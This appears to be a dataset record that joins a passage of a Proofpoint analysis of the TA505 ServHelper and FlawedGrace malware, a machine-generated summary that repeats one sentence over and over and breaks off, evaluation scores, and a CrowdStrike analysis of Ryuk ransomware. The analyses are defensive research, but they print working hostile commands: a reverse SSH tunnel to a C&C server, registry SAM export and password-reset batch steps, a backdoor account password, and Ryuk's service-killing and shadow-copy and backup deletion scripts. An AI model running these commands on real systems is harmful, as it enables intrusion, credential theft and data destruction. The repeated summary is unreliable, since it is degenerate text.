""supportaccount"" with a password of ""Ghar4f5""Adding this user to the ""Remote Desktop Users"" and ""Administrators"" groupsIn more recent versions, this functionality of the loader component was integrated into the core ServHelper code, using built-in Windows remote desktop support instead of a third-party software package. This command sets up a reverse SSH tunnel by executing the dropped OpenSSH binary with the following command line arguments:-N -R <remote port>:localhost:3389 tunnel@<C&C server>Once configured, ServHelper sends a ""tun ok\rport:<remote port> tun pid:<SSH process id>"" to the C&C server.slpSets a sleep timeout.fox (""tunnel"" variant only)Copies a Firefox web browser profile from one user to another. Earlier versions used the Windows ""xcopy"" command. Later versions download a self-extracting RAR file from the C&C server (/cp/cp.exe) and decompress it using the password ""123"". One of the files in this archive is a piece of software known as ""Runtime's Shadow Copy"" and it is used to copy the web browser profiles.chrome (""tunnel"" variant only)Similar to the ""fox"" command but for Chrome web browser profiles.killtun (""tunnel"" variant only)Kills an SSH tunnel process associated with a particular remote port. Once killed, it sends a ""killtun ok"" message to the C&C server.tunlist (""tunnel"" variant only)Gets a list of all active SSH tunnels and responds to the C&C server with a message containing ""active tun: <remote port>"" entries for each active tunnel.killalltuns (""tunnel"" variant only)Kills all SSH tunnel processes.shellExecutes a shell command and sends the response to the C&C server.loadDownloads and runs an executable from a specified URL. Responds to the C&C server with either ""load no param ok"" or ""load param ok"" depending if any command-line arguments were passed to the downloaded executable.socks (""tunnel"" variant only)Similar to the ""tun"" command, but allows a reverse SSH tunnel to be built between the C&C server to any server/port (as specified by the command argument) through the infected system. Once configured, a ""socks ok\rport:<remote port> tun pid:<SSH process id>"" message is sent to the C&C server.selfkillRemoves the malware from the infected machine.loaddll (""downloader"" variant only)A newer command that has only been observed in the ""downloader"" variant. Similar to the ""load"" command, but for DLLs.bk (""tunnel"" variant only)A newer command similar to the ""tun"" command. ""bk"" allows the reverse SSH tunnel to be set up using a C&C specified remote host instead of the hardcoded C&C server.hijack (""tunnel"" variant only)A newer command that appears to hijack a user account with a known password (""123""). It does so by creating and scheduling a task ""test"" to run a batch file containing the following commands:reg export hklm\sam c:\sam.regreg export hklm\security c:\sec.regnet user <command argument username> 123It then schedules a task ""test2"" to run another batch file containing the following commands:schtasks /delete /tn ""test"" /Freg import c:\sam.regreg import c:\sec.regschtasks /delete /tn ""test2"" /FFinally it runs the first scheduled task ands send a ""ready! try to login with pass 123"" message to the C&C server.forcekill (""tunnel"" variant only)A newer command that is similar to the ""killalltuns"" but uses the Windows ""taskkill"" command.sethijack (""tunnel"" variant only)A newer command that controls an ""alerting"" mechanism. A separate program thread monitors user logons. When a legitimate user becomes active and the threat actor is connected to the infected system using the previously created ""supportaccount"" account, it runs the ""chrome"" and ""fox"" commands, copying the legitimate user's web browser profiles to the ""supportaccount"" user. It then alerts the threat actor by sending message boxes containing ""login detected, begin hijacking"" and ""profiles hijacked!"" messages. These are sent by a ""msg.exe"" program contained in the ""cp.exe"" archive discussed in the ""fox"" command above.chromeport (""tunnel"" variant only)A newer command that implements the same functionality as the ""chrome"" command.During some of the ServHelper ""downloader"" campaigns, we observed commands (e.g., as shown in Figure 4 above) instructing the malware to download and execute another malware we call ""FlawedGrace"".FlawedGrace Malware AnalysisFlawedGrace is a remote access trojan (RAT) named after debugging artifacts (class names) left in the analyzed sample (see Figure 6).Figure 6: ""Grace"" class names shown by IDA ProThe malware is written in C++. It is a very large program and makes extensive use of object-oriented and multithreaded programming techniques. This makes reverse engineering and debugging the malware both difficult and time consuming. The coding style and techniques suggest that FlawedGrace was not written by the same developer as ServHelper.We initially observed FlawedGrace in an email campaign as early as November 2017, but until the recent ServHelper campaigns, we had not observed it being actively distributed again. The malware usually contains a debug string including a ""version number"" and ""build date"" distinct from the PE compile timestamp, allowing searches of various malware repositories to find additional versions:Unknown version number built at ""Aug 7 2017 22:28:47""Version 2.0.7 built at ""Oct 18 2017 04:18:39""Version 2.0.8 built at ""Oct 26 2017 12:05:44""Version 2.0.9 built at ""Nov 4 2017 22:28:10""Version 2.0.10 built at ""Nov 20 2017 10:53:33""Version 2.0.11 built at ""Dec 16 2017 08:02:46""Per the malware's debug strings, significant development took place during the end of 2017. The ServHelper campaigns were distributing version 2.0.10 of the malware.FlawedGrace creates, encrypts, and stores a configuration file containing the C&C IPs and ports in a ""<hex digits>.dat"" file (e.g., ""C:\ProgramData\21851a60.dat""). The first 16 bytes of the file are an AES initialization vector (IV). The rest of the data is AES-encrypted in CBC mode. In the analyzed sample, the AES key was hardcoded as ""c3oeCSIfx0J6UtcV"". Once decrypted, the configuration data is stored as a custom serialization (Figure 7). Early versions of the malware used the class names ""GraceParams"" and ""GraceValue"" when interacting with this part of the code, so it is likely that the serialization was designed and developed by the malware developer and not a standard format.Figure 7: Plaintext configuration file showing C&C IP and portFlawedGrace uses a complicated binary protocol for its command and control. It can use a configurable port for communications, but all samples we have observed to date have used port 443. Figure 8 shows an example of the first four messages between an infected system and C&C server.Figure 8: FlawedGrace's initial C&C communications.We are still reverse engineering and documenting the protocol, but we can provide an overview of the initial C&C communications below:Message 1Initial beacon from infected system. It is a 14-byte binary structure that contains at least the following parts:Offset 0x0: CRC32 hash of remaining data (DWORD)Offset 0x4: magic bytes ""GCRG"" (DWORD)Message 2Key verification message from infected system. We believe that this is used to verify that one of the encryption keys (static key) is the same on both the malware and C&C server. It is a 52-byte binary structure that contains the following analyzed offsets, among other components still under analysis:Offset 0x0: CRC32 hash of remaining data (DWORD)Offset 0x14: MD5 hash of the following pieces (16 bytes) A static key which has always been ""static pass"" in the samples analyzed The random bytes at offset 0x24 that have been hex encoded and uppercasedOffset 0x24: random bytes (16 bytes)Message 3Key exchange message from C&C server. This message delivers a second encryption key (dynamic key) used for further data transfers. It is a 42-byte structure that contains the following analyzed offsets, among other components still under analysis:Offset 0x0: CRC32 hash of remaining data (DWORD)Offset 0x1a: dynamic key (16 bytes)Message 4An example of data transfer between infected system and C&C server. It starts with a 38-byte binary header that contains the following analyzed offsets, among other components still under analysis:Offset 0x0: CRC32 hash of the next 10 bytes (DWORD)Offset 0xE: AES IV (16 bytes)Following the header is the data that has been AES-encrypted in CBC mode. The AES key is generated using the ""static key"" and the ""dynamic key"" from messages 3 and 4 above. An example of key generation in Python appears in Figure 9.Figure 9: Example FlawedGrace C&C data transfer encryption key generation in PythonFigure 10 shows an example of the plaintext data transferred in message 4.Figure 10: Example FlawedGrace C&C message 4 plaintext dataThis message contains various system and malware information that has been serialized using the same method as for configuration files. The serialized data is then packaged within additional binary data structures.While there are other message types with their own formats, the examples here provide initial insight into FlawedGrace's C&C protocol.FlawedGrace also uses a series of commands, provided below for reference:target_removetarget_updatetarget_reboottarget_module_loadtarget_module_load_externaltarget_module_unloadtarget_downloadtarget_uploadtarget_rdptarget_passwordstarget_serverstarget_scriptdestroy_osdesktop_statConclusionThreat actor TA505 is both consistent and prolific. When the group distributes new malware, it may be a blip (like Bart ransomware, which was only distributed for one day in 2016) or like Locky ransomware it may become the dominant strain of malware in the wild. In this case, the group has started distributing two variants on a new backdoor we named ServHelper and a RAT we call FlawedGrace. This also extends the trend that emerged in 2018, in which threat actors increasingly focused on distribution of downloaders, information stealers, RATS, and other malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. We will continue to observe the distribution of these three malware variants but, at this time, they do not appear to be one-offs, but rather long-term investments by TA505.References[1] https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments[2] https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malwareIndicators of Compromise (IOCs)IOC IOC Type Description 52c72a9de2f6e892f07827add85ad913b0541cd5c8449aadc2722f8eb75e548c SHA256 November 9 ""Tunnel"" campaign attachment hxxp://officemysuppbox[.]com/staterepository URL November 9 ""Tunnel"" campaign payload 1b0859ddbdebcb9d2bb46de00d73aa21bc617614b8123054426556783b211bc8 SHA256 November 9 ""Tunnel"" campaign ServHelper hxxps://checksolutions[.]pw/ghuae/huadh.php URL November 9 ""Tunnel"" campaign ServHelper C&C hxxps://rgoianrdfa[.]pw/ghuae/huadh.php URL November 9 ""Tunnel"" campaign ServHelper C&C hxxps://arhidsfderm[.]pw/ghuae/huadh.php URL November 9 ""Tunnel"" campaign ServHelper C&C eb66ebb95a3dcecae64c61f611a9332fbf460d1b8039d3ab7e4f220104a4bec4 SHA256 November 15 ""Downloader"" campaign attachment hxxp://offficebox[.]com/host32 URL November 15 ""Downloader"" campaign payload 3cd7e0a8321259e8446b2a9da775aae674715c74ff4923cfc8ec5102f380d41a SHA256 November 15 ""Downloader"" campaign ServHelper f4b9219f329803dd45afd5646351de456e608dd946830c961ec66c6c25e52cac SHA256 December 13 ""FlawedGrace"" campaign attachment hxxp://office365onlinehome[.]com/host32 URL December 13 ""FlawedGrace"" campaign payload d56429d6d0222022fe8f4cb35a28cd4fb83f87b666a186eb54d9785f01bb4b58 SHA256 December 13 ""FlawedGrace"" campaign ServHelper hxxps://afgdhjkrm[.]pw/aggdst/Hasrt.php URL December 13 ""FlawedGrace"" campaign ServHelper C&C efcee275d23b6e71589452b1cb3095ff92b10ab68cd07957b2ad6be587647b74 SHA256 December 13 ""FlawedGrace"" campaign FlawedGrace 46.161.27[.]241:443 IP:Port December 13 ""FlawedGrace"" campaign FlawedGrace C&C 9fccd107bd0aee3a2f39ad76a49758309c95545d8154b808eec24d2b51dc4579 SHA256 ""sethijack"" command ServHelper hxxp://dedsolutions[.]bit/sav/s.php URL ""sethijack"" command ServHelper C&C hxxp://dedoshop[.]pw/sav/s.php URL ""sethijack"" command ServHelper C&C hxxp://asgaage[.]pw/sav/s.php URL ""sethijack"" command ServHelper C&C hxxp://sghee[.]pw/sav/s.php URL ""sethijack"" command ServHelper C&C a9492312f1258567c3633ed077990fe053776cd576aa60ac7589c6bd7829d549 SHA256 ""loaddll"" command ServHelper hxxps://vesecase[.]com/support/form.php URL ""loaddll"" command ServHelper C&CET and ETPRO Suricata/Snort Signatures2833522 ETPRO TROJAN Observed Malicious SSL Cert (HuadhServHelper RAT CnC)2833552 ETPRO TROJAN HuadhServHelper RAT CnC Domain Observed in SNI2833881 ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)2833985 ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)2834074 ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)2834233 ETPRO TROJAN ServHelper CnC Inital Checkin2828489 ETPRO TROJAN FlawedGrace CnC Activity";"The ITSecurity report indicates that the malicious actors are targeting the US retail industry with malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and grab"" malware like ransomware. The malicious actors are investing in distribution of malware that can remain resident on victim devices for far longer than destructive, ""smash and";en;{'r': 0.030120481927710843, 'p': 0.8571428571428571, 'f': 0.05819592562925639};{'r': 0.010348071495766699, 'p': 0.55, 'f': 0.02031394238909224};{'r': 0.030120481927710843, 'p': 0.8571428571428571, 'f': 0.05819592562925639}
https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/;What is Ryuk Ransomware? The Complete Breakdown;"WIZARD SPIDER is a sophisticated eCrime group that has been operating the Ryuk ransomware since August 2018, targeting large organizations for a high-ransom return. This methodology, known as ""big game hunting,"" signals a shift in operations for WIZARD SPIDER. This actor is a Russia-based criminal group known for the operation of the TrickBot banking malware that had focused primarily on wire fraud in the past.The actor name GRIM SPIDER was introduced into CrowdStrike's nomenclature in September 2018 for the group that operates the Ryuk ransomware as a distinct sub-group of the WIZARD SPIDER criminal enterprise. However, in June 2019, further evidence emerged that allowed CrowdStrike to assess with high confidence that Ryuk is in fact operated as part of the core WIZARD SPIDER actor group.CrowdStrike Intelligence will now solely use the actor name WIZARD SPIDER in association with TrickBot and Ryuk. The GRIM SPIDER actor name has been deprecated.Similar to Samas and BitPaymer, Ryuk is specifically used to target enterprise environments. Code comparison between versions of Ryuk and Hermes ransomware indicates that Ryuk was derived from the Hermes source code and has been under steady development since its release. Hermes is commodity ransomware that has been observed for sale on forums and used by multiple threat actors. However, Ryuk is only used by WIZARD SPIDER and, unlike Hermes, Ryuk has only been used to target enterprise environments. Since Ryuk's appearance in August, the threat actors operating it have netted over 705.80 BTC across 52 transactions for a total current value of $3,701,893.98 USD.Want the latest insights on the cyber threat landscape? Download the 2021 Global Threat Report1. Ryuk Ransom NotesThe Ryuk ransom note is written to a file named RyukReadMe.txt . A number of different ransom note templates have been observed. The body of the template is static with the exception of the email address and the Bitcoin (BTC) wallet address, which may change. The email addresses usually contain one address at protonmail.com and another address at tutanota.com. The email names typically are esoteric actors and directors, but Instagram models have also been observed. Interestingly, the ransom note in Figure 3 is remarkably similar to the BitPaymer ransom notes. As of this writing, it remains unclear if WIZARD SPIDER is copying the TTPs (tactics, techniques and procedures) and ransom notes of BitPaymer, or whether the groups may share information with each other.Figure 3. Ryuk Ransom Note Bearing Strong Resemblance to BitPaymerThe ransom email used by Ryuk appears to be unique for each compiled executable. Our Using threat intelligence, our team has observed several different email addresses, but the same BTC addresses across multiple Ryuk executables. On Nov. 29, 2018, WIZARD SPIDER changed how they communicated with their victims. As seen in the previous ransom note version, WIZARD SPIDER included their BTC address and email addresses. However, recent variants of Ryuk no longer contain the BTC address -- only the email addresses. The ransom note states that the victim will receive the BTC address as a reply from WIZARD SPIDER. The new ransom note can be seen below.Figure 4. Ryuk Ransom With BTC Address RemovedEarly Ryuk binaries with the removal of the BTC address contained a PDB path of C:\Users\Admin\Documents\Visual Studio 2015\Projects\ConsoleApplication54new crypted try to clean\x64\Release\ConsoleApplication54.pdb . This PDB path started appearing on Nov. 29, 2018. The removal of the BTC addresses occurred a day after the U.S. Department of Justice unsealed indictments for two individuals involved in facilitating cashouts from Samas Bitcoin addresses.Ransom PaymentsBased on observed transactions to known Ryuk BTC addresses, the ransom demand varies significantly. This suggests that WIZARD SPIDER (like INDRIK SPIDER with BitPaymer) calculates the ransom amount based on the size and value of the victim organization. To date, the lowest observed ransom was for 1.7 BTC and the highest was for 99 BTC. With 52 known transactions spread across 37 BTC addresses (as of this writing), WIZARD SPIDER has made 705.80 BTC, which has a current value of $3.7 million (USD). With the recent decline in BTC to USD value, it is likely GRIM SPIDER has netted more. The tables in the Appendix include a set of known Ryuk BTC addresses extracted from Ryuk binaries, which are believed to be only a subset of the Ryuk BTC addresses.2. How Ryuk Ransomware is DistributedCrowdStrike(r) has conducted multiple incident response (IR) engagements responding to Ryuk infections in which TrickBot was also identified on hosts in the victim environment. CrowdStrike Falcon(r) Intelligence(tm)(r) believes that the initial compromise is performed through TrickBot, which is typically distributed either via spam email or, through the use of the Emotet (developed and operated by MUMMY SPIDER) geo-based download function. Falcon Intelligence has been monitoring the geo-based download activity from Emotet and, during 2018, MUMMY SPIDER has been an avid supporter of WIZARD SPIDER, predominantly distributing TrickBot to Emotet victims in the U.K., the U.S., and Canada.Some of TrickBot's modules (such as pwgrab ) could aid in recovering the credentials needed to compromise environments -- the SOCKS module in particular has been observed tunneling PowerShell Empire traffic to perform reconnaissance and lateral movement. Through CrowdStrike IR engagements, WIZARD SPIDER has been observed performing the following events on the victim's network, with the end goal of pushing out the Ryuk binary:An obfuscated PowerShell script is executed and connects to a remote IP address.A reverse shell is downloaded and executed on the compromised host.PowerShell anti-logging scripts are executed on the host.Reconnaissance of the network is conducted using standard Windows command line tools along with external uploaded tools.Lateral movement throughout the network is enabled using Remote Desktop Protocol (RDP).Service User Accounts are created.PowerShell Empire is downloaded and installed as a service.Lateral movement is continued until privileges are recovered to obtain access to a domain controller.PSEXEC is used to push out the Ryuk binary to individual hosts.Batch scripts are executed to terminate processes/services and remove backups, followed by the Ryuk binary.3. From Hermes to Ryuk: Similarities & DifferencesHermes ransomware, the predecessor to Ryuk, was first distributed in February 2017. Only one month after its release, a decryptor was written for Hermes, followed by the release of version 2.0 in April 2017, which fixed vulnerabilities in its cryptographic implementation. Since this release, the only way for a victim to recover files is with the private encryption key, which is obtained by paying the ransom. In late August 2017, Hermes version 2.1 was released.Hermes was originally sold on forums for $300 USD. When purchased, the buyer received a build that supported two email addresses, a decryptor and a unique RSA key pair. If the purchaser desired more email addresses, they were required to purchase another build for an additional $50. The seller of Hermes ransomware appears to have stopped or limited advertising on forums in 2017.Early versions of Hermes were reportedly installed via internet-accessible RDP servers protected by weak credentials. In October 2017, Hermes was deployed as a destructive distraction for a Society for Worldwide Interbank Financial Telecommunication (SWIFT) compromise at the Far Eastern International Bank (FEIB) in Taiwan. Hermes' role in the SWIFT attack is described in more detail in the Attribution section at the end of this blog. In March 2018, Hermes was observed targeting users in South Korea via the GreenFlash Sundown exploit kit.In mid-August 2018, a modified version of Hermes, dubbed Ryuk, started appearing in a public malware repository. Ryuk was tailored to target enterprise environments and some of the modifications include removing anti-analysis checks. These checks include querying the Process Environment Block (PEB) to see if the field is BeingDebugged , or querying the PEB to see if the field NtGlobalFlag has been set, checking to see if the host is running VirtualBox by calling the instruction CPUID, and ensuring that the host language is not Russian, Ukrainian, or Belarusian. From a process and file perspective, Hermes and Ryuk target files in a similar fashion. The core differences are Ryuk's logic that handles file access, and the use of a second, embedded public RSA key.The following are characteristics that have not changed:Encrypts files using RSA-2048 and AES-256Stores keys in the executable using the proprietary Microsoft SIMPLEBLOB formatEncrypts mounted devices and remote hostsUses a file marker of HERMES to mark or check if a file has been encryptedAnother notable difference between Hermes and Ryuk is how the encryption keys are created. Hermes starts the encryption initialization by first generating an RSA public and private key pair -- referred to as a ""victim key."" An AES-256 key is generated and the victim's RSA private key is encrypted in AES-CBC mode. The attacker-controlled public RSA key is used to encrypt the AES key (previously used to encrypt the victim's RSA private key). Then, for each file encrypted, an AES key is generated, which is used to encrypt the file. Finally, the AES key for each file is encrypted with the victim's RSA public key, then stored at the end of the file.Ryuk contains the same logic, but no longer generates the victim-specific RSA key pair. Instead, Ryuk has two public RSA keys embedded in the executable, and what was previously the victim's RSA private key is encrypted and embedded in the executable. Because Ryuk does not generate a victim-specific RSA key pair, all hosts can be decrypted with the same decryption key. This might appear to be a design flaw but is not, since Ryuk has a unique key for each executable.If a single executable is used for a single victim environment, then there are no repercussions if the private keys are leaked because it will only decrypt the damage from a single Ryuk executable. Thus, it is highly likely that Ryuk pre-generates the RSA key pairs for each victim. This is arguably more secure, since the victim's system will never have access to the unencrypted RSA key pair parameters without paying the ransom. This approach is similar to INDRIK SPIDER's BitPaymer ransomware, which generates a victim-specific sample with a hard-coded public key.4. Ryuk Functionality: A Technical AnalysisThere are two types of Ryuk binaries: a dropper (which is not commonly observed) and the Ryuk executable payload. Recovery of Ryuk droppers are rare, due to the Ryuk executable payload deleting the dropper when executed. Upon execution, the dropper constructs an installation folder path. The folder path is created by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. This is used to create a string that contains the drive letter path. If the host operating system is Windows XP or earlier, the string Documents and Settings\Default User\ is appended to the drive letter path. If the host is Windows Vista or newer, the string users\Public\ is appended to the drive letter path. For Windows XP, an example folder path would be C:\Documents and Settings\Default User\ , and for Window Vista or higher, the path would be C:\Users\Public.A random executable file name is then constructed. It is created by calling _srand with a seed value returned from calling GetTickCount , then _rand is continuously called until five alphabetic characters are concatenated together. The extension .exe is then appended. The dropper checks whether the host is 32-bit or 64-bit by calling IsWow64Process and writes one of two embedded payload executables corresponding to the host's architecture. The newly written executable is then run by calling ShellExecuteW . The Ryuk payload executable written by the dropper is the Ryuk component that contains the core logic for encrypting files on the host.Ryuk is under constant development. In recent months, Ryuk binaries have continued to deviate further and further from the original Hermes source code, with the threat actors adding and removing functionality often. In November 2018, Falcon Intelligence identified new functionality added to Ryuk that included an anti-analysis infinite loop, a ping-like request to an IP address once the encryption process was completed, and the addition of an appended file extension for encrypted files. Of these three new features, only the file extension is still present in an executable compiled on Dec. 20, 2018.File EncryptionCompared to other families of ransomware, Ryuk has very few safeguards to ensure stability of the host by not encrypting system files. For example, many ransomware families contain extensive lists of file extensions or folder names that should not be encrypted (whitelisted), but Ryuk only whitelists three extensions: It will not encrypt files with the extensions exe, dll , or hrmlog . The last extension appears to be a debug log filename created by the original Hermes developer. It should be noted that absent from this list is sys (system drivers), ocx (OLE control extension) and other executable file types. Encrypting these files could make the host unstable. Early versions of Ryuk included the whitelisting of ini and lnk files, but these have been removed in recent builds. The following folder names are also whitelisted and not encrypted.ChromeMozillaRecycle.binWindowsMicrosoftAhnLabThis is only a small subset of folder names that should be whitelisted in order to ensure stability on the host. While doing dynamic analysis, it was not uncommon to observe Ryuk attempting to encrypt files related to the Windows Bootloader ( C:\Boot ) or other critical files and folders. Due to the absence of proper whitelisting, an infected machine can become unstable over time and unbootable if restarted.As mentioned in the Hermes to Ryuk section, Ryuk uses a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Without the private key provided by WIZARD SPIDER, the files cannot be decrypted and are unrecoverable. A thread is created for the encryption of each file and each file is encrypted with its own AES key. After the file has been encrypted, a file extension of .RYK is appended to the file. All directories will have a ransom note of ( RyukReadMe.txt ) written to the directory.Ryuk attempts to encrypt all mounted drives and hosts that have Address Resolution Protocol (ARP) entries (IP addresses) and it enumerates all mounted drives by calling GetLogicalDrives . For each mounted drive, Ryuk calls GetDriveTypeW to determine the drive's type. If the drive type is not a CD-ROM, files on the drive are encrypted. To retrieve IP addresses that have ARP entries, Ryuk calls GetIpNetTable . It iterates through all entries and then tries to enumerate files and folders on the remote host and encrypt the files.PersistenceCurrent builds of Ryuk no longer contain persistence functionality. Previously, to remain persistent on the host, Ryuk created a registry entry under the Run key using Windows cmd.exe shell. The following command line was used to write to the Registry Run Key name svchos to HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run with the value being the path to the Ryuk executable.Process InjectionRyuk does not encrypt files from within its own process memory space, but injects into a remote process. Before injecting into a remote process, Ryuk attempts to adjust its token privileges to have the SeDebugPrivilege . It takes no action if the adjustment of the token privileges fails. Before injecting into a remote process, Ryuk also calls CreateToolhelp32Snapshot to enumerate all running processes. If a process is found that is not named csrss.exe, explorer.exe, lsaas.exe , or is running under NT AUTHORITY system account, Ryuk will inject itself into this single process. By ensuring that the process is not running under NT AUTHORITY , the developers are assuming the process is not running under another account and therefore can be written to. Ryuk uses a combination of VirtualAlloc, WriteProcessMemory and CreateRemoteThread to inject itself into the remote process.Process/Service Termination and Anti-Recovery CommandsUnlike other families of ransomware, Ryuk does not contain process/service termination and anti-recovery functionality embedded in the executable. In the past, Ryuk did contain these capabilities, but they have been removed and are contained within two batch files.The batch file kill.bat contains commands for stopping services, disabling services and killing processes. The processes and services are stopped to ensure no open handles exist for files that will be encrypted. The following figure is a subset of each command.net stop avpsus /ynet stop McAfeeDLPAgentService /ynet stop mfewc /ynet stop BMR Boot Service /ynet stop NetBackup BMR MTFTP Service /y...sc config SQLTELEMETRY start= disabledsc config SQLTELEMETRY$ECWDB2 start= disabledsc config SQLWriter start= disabledsc config SstpSvc start= disabled...taskkill /IM mspub.exe /Ftaskkill /IM mydesktopqos.exe /Ftaskkill /IM mydesktopservice.exe /FFigure 1. Process/Services Termination kill.bat CommandsCrowdStrike has observed another batch file, named windows.bat , which makes file recovery more difficult on the victim's machine. It should be noted that file names can be arbitrarily changed by the threat actors. The contents of the batch file are shown below in Figure 2.vssadmin Delete Shadows /all /quietvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MBvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unboundedvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MBvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unboundedvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MBvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unboundedvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MBvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unboundedvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MBvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unboundedvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MBvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unboundedvssadmin Delete Shadows /all /quietdel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dskdel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dskdel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dskdel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dskdel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dskdel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dskdel %0Figure 2. Anti-Recovery window.bat CommandsThese anti-forensic recovery commands are quite interesting and appear to make use of an undocumented feature of the vssadmin resize command. While the first command in Figure 2 above, vssadmin Delete Shadows /all /quiet , is commonly used by ransomware, the command option vssadmin resize shadowstorage is rarely used. In situations where shadow copies were not created by vssadmin , but by third-party applications (such as backup software), vssadmin can display an error and not delete the backups. One such error states: ""Snapshots were found, but they were outside of your allowed context. Try removing them with the backup application which created them."" The vssadmin resize shadowstorage command is a ""hack"" that relies on vssadmin to delete storage when the shadow copies are resized. It forces the shadow copies to be deleted regardless of their context. The command works by resizing the default shadow volume size from 10 percent to 401 MB (the minimum size is 300 MB). Then the shadow storage is set to unbounded, which allows it to use all available disk space. The shadow copies are then deleted by calling the command vssadmin Delete Shadows /all /quiet a second time.The final set of commands deletes files based on their extension or folder locations. The command arguments are for del delete files in all sub-directories ( /s ) in quiet mode ( /q) without asking the user for confirmation and to force (/f) the deletion of a file. The file extensions are for Virtual Hard Disk ( .VHD ), Avantrix Backup Plus files ( .bac ), backup copy ( .bak ), Windows Backup Catalog File ( .wbcat ), Windows Backup Utility File ( .bfk ), setting files ( .set ), Windows Backup File ( .win ), Disk Images ( .dsk ) and all folders that start with Backup. Note that since the del command does not securely delete a file (i.e., overwrite a file before deletion), some level of file recovery may be possible using forensic tools. The last command of del %0 deletes the executing .bat file.The anti-recovery commands used by Ryuk are more extensive than most ransomware families. These commands have not been observed being used by other ransomware families yet. This indicates that the threat actors have a thorough understanding of enterprise backup software.5. AttributionNorth KoreaOpen-source reporting has claimed that the Hermes ransomware was developed by the North Korean group STARDUST CHOLLIMA (activities of which have been public reported as part of the ""Lazarus Group""), because Hermes was executed on a host during the SWIFT compromise of FEIB in October 2017. Table 1 contains samples that are possibly attributed to the compromise. The two executables related to Hermes are bitsran.exe and RSW7B37.tmp .Name Functionality Compile Time Compiler Version Linker Version msmpeng.exe TwoPence implant Mon Feb 20 11:09:30 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Visual C++ 10.0 2010 SP1 (build 40219) splwow32.exe TwoPence implant Mon Feb 20 11:09:30 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Visual C++ 10.0 2010 SP1 (build 40219) FileTokenBroker.dll Loader Thu Jan 05 01:11:33 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Visual C++ 10.0 2010 SP1 (build 40219) bitsran.exe Dropper/spreader Sun Oct 1 09:37:31 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Visual C++ 10.0 2010 (build 30319) RSW7B37.tmp Hermes ransomware Sun Oct 1 05:34:07 2017 Visual C++ 9.0 2008 SP1 (build 30729) UnknownTable 1. File Information for Binaries Used in the FEIB SWIFT CompromiseThe first executable, bitsran.exe , is a dropper, and RSW7B37.tmp is the Hermes ransomware executable. The dropper's goal is to propagate the Hermes executable within a network by creating scheduled tasks over SMB sessions using hard-coded credentials. The Hermes executable then encrypts files on the host. It is interesting to note that the compiler and linker for Hermes is different from the other executables. All of the executables except for Hermes were compiled with Visual Studio 10, with a linker of Visual Studio 10. Hermes, in contrast, was compiled with Visual Studio 9, with an unknown linker.If the time stamps are correct, the two executables ( bitsran.exe and RSW7B37.tmp ) were compiled within four hours and three minutes of each other. Due to the short time frame of Hermes being bundled within an executable that was hard-coded with credentials of the FEIB network, Falcon Intelligence assesses that STARDUST CHOLLIMA likely had access to the Hermes source code, or a third party compiled and built a new version for them. Unlike other variants of Hermes, RSW7B37.tmp does not append the exported and encrypted AES key to the end of the file. Figure 5 is a file encrypted by Hermes with the exported AES key appended to the end of the file as a footer.Figure 5. Example Hermes Footer with Encrypted AES KeyFigure 6 is the end of a file encrypted by the Hermes variant RSW7B37.tmp used in the SWIFT attack. The footer only contains 